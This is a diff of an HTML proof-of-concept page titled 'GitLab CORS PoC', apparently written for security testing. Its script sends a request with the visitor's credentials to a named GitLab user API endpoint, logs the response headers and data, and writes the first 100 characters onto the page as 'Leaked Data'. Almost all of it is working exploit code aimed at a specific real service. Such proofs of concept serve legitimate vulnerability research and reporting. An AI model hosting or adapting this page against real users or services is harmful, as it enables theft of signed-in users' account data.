@@ -1,21 +1,40 @@
+<!-- cors-poc.html -->
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CORS PoC</title>
-</head>
 <body>
-  <h2>Testing CORS...</h2>
-  <script>
-    fetch("https://alerts.gitlab.net/api/v4/user", {
-      credentials: "include"
-    })
-    .then(response => response.text())
-    .then(data => {
-      console.log("[+] Response from GitLab:", data);
-    })
-    .catch(error => {
-      console.log("[!] CORS blocked or error:", error);
-    });
-  </script>
+<h1>GitLab CORS PoC</h1>
+<script>
+// 1. Target URL
+const url = 'https://alerts.gitlab.net/api/v4/user';
+
+// 2. Send request
+fetch(url, {
+  credentials: 'include',
+  headers: { 
+    'Origin': window.location.origin 
+  }
+})
+.then(response => {
+  // 3. Log headers
+  console.log("Status:", response.status);
+  console.log("Headers:");
+  for (const [key, value] of response.headers.entries()) {
+    console.log(`${key}: ${value}`);
+  }
+  
+  // 4. Process response
+  return response.text();
+})
+.then(data => {
+  console.log("Response Data:", data);
+  document.getElementById("result").innerText = 
+    "Leaked Data: " + data.substring(0, 100) + "...";
+})
+.catch(error => {
+  console.error("Error:", error);
+  document.getElementById("result").innerText = "Error: " + error.message;
+});
+</script>
+<div id="result" style="white-space: pre-wrap;font-family: monospace;"></div>
 </body>
 </html>
